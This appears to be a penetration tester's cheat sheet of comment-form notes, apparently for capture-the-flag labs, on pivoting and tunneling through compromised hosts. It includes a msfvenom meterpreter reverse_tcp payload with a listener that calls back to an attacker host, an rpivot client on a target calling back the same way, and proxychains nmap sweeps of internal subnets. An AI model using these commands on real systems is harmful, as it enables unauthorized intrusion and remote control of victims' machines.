// Pivoting, Tunneling, and Port Forwarding
//! SSH
//* Port Forwarding
// port 1234,8080 on your local machine will be forwarded to port 3306,80 on the remote machine
// ssh -L 1234:localhost:3306 -L 8080:localhost:80 {username}@{ip}
//* Reverse Port Forwarding
// port 8080 on the remote machine will be forwarded to port 8000 on your local machine
// ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
//* Tunneling
// at /etc/proxychains.conf => socks5 127.0.0.1 1080
// ssh -D 1080 {username}@{ip}
// Now when you start any command with proxychains using the below command,
// it will route all the packets of Nmap to the local port 1080, where our SSH client is listening,
// which will forward all the packets over SSH to the 172.16.5.0/23 network.
// proxychains nmap -v -sn 172.16.5.1-200
//! Meterpreter
//* gaining reverse meterpreter shell from target to attacker machine
// generate payload => msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={attacker-ip} -f elf -o backupjob LPORT={port}
// transfer the payload to the target machine
// set a listener using msfconsole :
// use exploit/multi/handler
// set payload linux/x64/meterpreter/reverse_tcp
// then run the transferred payload on the target machine
//* Ping Sweep
// run post/multi/gather/ping_sweep RHOSTS={subnet-ip}/23
//* Getting routes from routing table
// run autoroute -s {subnet-ip}/23
// run autoroute -p
//! Sshuttle
// sudo sshuttle -r {username}@{ip} {subnet-id}/23 -v
// after this we don't need proxychains, all the traffic will be routed through the sshuttle automatically
//! Web Server Pivoting with Rpivot
// at ctf/rpivot
// worked ouly with socks4
//* opening the server on the attacker machine
// python2.7 server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
//* running the client on the target machine
// python2.7 client.py --server-ip {attacker-ip} --server-port 9999
//* running browser with the proxy
// proxychains firefox-esr {internal-wesite-ip}:{port}
//! From Windows Machine
//* Using plink for tunneling
// plink -ssh -D 1080 {username}@{ip}
//* Using Netsh.exe to Port Forward
// netsh.exe interface portproxy add v4tov4 listenport={from-port} listenaddress={pivot-host} connectport={to-port} connectaddress={private-host}
// netsh.exe interface portproxy show v4tov4
// usage => xfreerdp /v:{pivot-host}:{from-port} /u:{username} /p:'{password}'
